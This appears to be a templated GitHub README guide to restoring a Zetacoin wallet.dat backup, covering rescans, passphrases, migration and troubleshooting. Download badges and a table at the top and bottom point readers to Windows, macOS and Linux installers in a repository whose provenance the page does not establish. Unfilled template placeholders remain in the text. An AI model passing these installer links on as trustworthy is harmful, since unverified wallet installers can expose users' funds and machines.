![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">Restore a Zetacoin Wallet Backup</h1>

<p align="center">How the Zetacoin wallet stores keys, and the steps that keep a copy which actually restores.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

To restore, install the current release, close it, copy your `wallet.dat` into the data directory, reopen the client and let it rescan the chain. The balance appears after the rescan finishes, not immediately. If the file is encrypted, you need the passphrase  -  there is no way around it.

## Before you start

Confirm three things: that the backup file is the one you think it is, that you have its passphrase if it was encrypted, and that the client you are restoring into is the current release from the project's releases page.

Restoring into an old build is the most common way to turn a working backup into a confusing afternoon. The file format is stable, but sync behaviour and rescan handling are not, and the older client will make a normal restore look broken.

The full walk-through, with the checks in order, is in [How to Back Up the Zetacoin Wallet](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/how-to-back-up-the-dat-file.md).

## The restore, step by step

1. Install the current client and launch it once so it creates a data directory.
2. Close the client completely.
3. Copy your backup `wallet.dat` into the data directory, replacing the newly created one.
4. Reopen the client and unlock it with the passphrase if prompted.
5. Let the rescan run. The balance appears when it finishes.
6. Confirm the addresses match what you expected and begin with `9`.

Step one matters more than it looks: the client needs to create its directory structure before you overwrite the wallet file, or it will recreate an empty wallet on next launch. Doing it in the wrong order costs a second restore, so it is worth the extra minute.

## Why the balance takes time to appear

A wallet file holds keys, not history. The client learns about your transactions by reading the chain and matching outputs to those keys, which is a scan over the whole chain.

On a freshly synced client the scan is the last step of the restore and can take a while. During it the wallet may show zero, which is expected rather than a failure. Closing the client mid-scan restarts the work.

If the balance never appears, the likely causes are a file that belongs to a different wallet, a scan that never completed, or keys for the retired chain  -  and the log distinguishes them in a few lines.

For the background behind this step, [Where the Zetacoin Wallet File Lives](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/where-the-dat-file-lives.md) covers the same ground in more detail.

## Encrypted backups

An encrypted `wallet.dat` needs its passphrase to unlock. Without it the file is unreadable, and there is no recovery mechanism  -  no hint, no reset, no support override.

This is the moment the passphrase discipline pays off. A passphrase stored in a password manager, separate from the file, is available exactly when it is needed; one stored only in memory is lost with the person who remembered it.

If you have the file but not the passphrase, the honest answer is that the coins are gone. Treat any offer to crack or recover the file as a scam, because that is what it is.

## Restoring into a fresh machine

On a new computer, install the client first and let it begin syncing. Restoring the wallet file before the chain exists produces a wallet that shows nothing until the chain catches up, which is normal but looks alarming.

The faster route is to restore the file and then use the bootstrap archive to bring the chain up quickly, so the rescan has data to work with. Order matters less than patience here: both paths end in the same place.

{{ARTICLE:move-zetacoin-wallet-new-computer}} covers the full migration, including what to do with the old machine.

## Checking that the restore is complete

A restore is finished when three things are true: the balance matches what you expected, the transaction history includes the movements you remember, and the addresses you used before are present in the wallet.

Any one of those alone can mislead. A balance can match while history is still filling in, and history can look right while an address you generated later is missing because the backup predates it.

If something is short, check the copy's date against the last transaction. A backup taken before a payment will not know about that payment, and no amount of rescanning will invent it. That is the one case where the correct response is to find a newer copy rather than to retry the restore.

## When the restore goes wrong

| Symptom | Cause | Fix |
| --- | --- | --- |
| Balance zero after restore | rescan not run or not finished | let it finish, then rescan |
| Client rejects the passphrase | wrong passphrase or wrong file | try the other backup before assuming the worst |
| Addresses differ from expected | different wallet file | check which backup you copied |
| Client crashes on open | file corrupt or client too old | verify the copy, install the current release |
| Coins visible but unspendable | legacy chain keys | see the legacy pages |

Most restores that "fail" are restores that were not given time, or were done into an old client.

## After a successful restore

Re-encrypt if the restored file was unencrypted, make a fresh backup of the working file, and take note of the blockchain height so you can tell later whether it is current.

Then update your other copies. A restore is the moment to notice that the backup was stale, and the moment to fix that before it matters again.

## Common questions

### Do I need the chain to restore a wallet?

No, but you need it to see a balance. The file restores the keys; the chain supplies the history.

### Can I restore without the passphrase?

No. An encrypted file cannot be unlocked without it, and there is no recovery process.

### Will restoring overwrite my current wallet?

If you replace `wallet.dat` in the data directory, yes. Copy the existing file aside first if it holds anything you care about.

### How long does the rescan take?

It reads the chain, so it scales with chain size. On a full chain, expect a wait measured in minutes to hours rather than seconds.

## The short version

Install the current build, close it, drop in `wallet.dat`, reopen, wait for the rescan, confirm the `9` addresses. Then back up the working file again.

Related pages: {{ARTICLE:how-to-backup-zetacoin-wallet}} for making the copy, {{ARTICLE:where-is-zetacoin-wallet-dat}} for the folder, {{ARTICLE:recover-lost-zetacoin-wallet-file}} if there is no file to restore, and {{ARTICLE:zetacoin-wallet-encryption-passphrase}} for the passphrase. Restore into the build from {{RELEASE}} rather than an older one.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Recover a Lost or Corrupt Zetacoin Wallet](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/recover-a-lost-or-corrupt-file.md)
- [How to Back Up the Zetacoin Wallet](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/how-to-back-up-the-dat-file.md)
- [Where the Zetacoin Wallet File Lives](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/where-the-dat-file-lives.md)
